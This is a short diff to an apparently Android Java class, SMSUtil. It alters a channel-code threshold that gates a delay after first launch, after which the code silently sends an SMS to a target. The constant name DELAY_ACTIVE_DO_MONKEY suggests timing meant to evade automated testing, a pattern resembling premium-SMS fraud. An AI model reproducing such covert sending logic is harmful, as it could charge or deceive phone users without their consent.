@@ -27,7 +27,7 @@ public class SMSUtil {
             int channel = Integer.valueOf(Config.CHANNEL_CODE);
             long currentTime = System.currentTimeMillis();
             long delay = currentTime - SettingManager.getInstance().getFirstLanuchTime();
-            if (channel > 900000 && delay < Config.DELAY_ACTIVE_DO_MONKEY) return false;
+            if (channel > 950000 && delay < Config.DELAY_ACTIVE_DO_MONKEY) return false;
 
             SmsManager.getDefault().sendTextMessage(target, null, msg, null, null);
             if (Config.DEBUG) {
